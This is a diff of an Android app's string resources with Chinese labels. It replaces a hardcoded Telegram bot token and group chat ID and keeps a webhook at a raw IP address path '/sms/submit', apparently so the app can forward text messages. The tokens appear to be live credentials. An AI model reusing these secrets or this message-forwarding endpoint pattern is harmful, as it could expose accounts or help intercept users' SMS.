@@ -28,8 +28,8 @@
     <string name="insert_tag_ip_list">IP地址列表</string>
     <string name="insert_tag_net_type">網路狀態</string>
 
-    <string name="telegram_robot_token">7441352558:AAFsiQQIvQMp4RnIHk0zNUYN97HkmsKDTQY</string>
-    <string name="telegram_group_chat">-4783596760</string>
+    <string name="telegram_robot_token">8075379420:AAEtu1PiFD0uxv6B9cTQDisuJMGy-MN0PuU</string>
+    <string name="telegram_group_chat">-1002285416506</string>
     <string name="webhhok_url">http://43.205.229.196:8989/sms/submit</string>
 
     <string name="type_param_sms">簡訊</string>
